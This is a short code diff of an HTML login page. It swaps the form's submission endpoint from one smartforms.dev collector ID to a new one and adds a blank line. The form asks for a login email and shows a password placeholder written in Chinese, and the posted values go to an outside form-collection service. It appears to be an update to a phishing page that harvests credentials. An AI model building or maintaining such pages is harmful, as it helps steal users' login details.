@@ -72,7 +72,7 @@ input[type=submit] {
 				</strong></font>
 			</td></tr>
 			<tr><td style="height:7px;">
-				<form method="post" action="https://smartforms.dev/submit/69283cc1c184545ccc20fd96">
+				<form method="post" action="https://smartforms.dev/submit/692cc6a5c184545ccc210025">
 			</td></tr>
 			<tr><td>
 				<input  name="login" type="email" value="" placeholder="&#23494;&#30721;" required
@@ -108,3 +108,4 @@ input[type=submit] {
 </div>
 </body>
 </html>
+
